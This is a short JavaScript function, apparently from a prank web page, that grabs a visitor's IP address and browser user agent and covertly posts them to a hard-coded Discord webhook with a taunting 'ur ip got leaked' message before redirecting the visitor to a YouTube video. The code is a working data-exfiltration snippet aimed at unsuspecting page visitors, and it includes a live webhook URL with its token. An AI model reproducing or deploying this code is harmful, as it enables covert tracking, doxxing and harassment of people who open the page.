async function ipthing() {
    let request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/978018295410200636/UYP01KB4CdKno6IhWChJbwuNZwZrNzIGqTbz62IH67_ltsgzhLV4_lKCDImdwemDho2i");
    request.setRequestHeader('Content-type', 'application/json');
    let ip
    await getIPs().then(res => {
        ip = res[0]
    })
    let params = {
        username: "reoccur.cat",
        avatar_url: "",
        content: "------------------------------\nhaha ur ip got leaked bozo",
        embeds: [
            {
                title: "information",
                description: `here's the information provided by the browser:\n> user agent: \`${navigator.userAgent}\`\n> ip address: \`${ip}\`\n`,
                color: 414168,
                footer: {
                    text: "this may contain sensitive information. please do not share."
                }
            }
        ],
    }
    request.send(JSON.stringify(params));
    window.location.href = 'https://www.youtube.com/watch?v=HaLZlOQapWs&t=10s'
}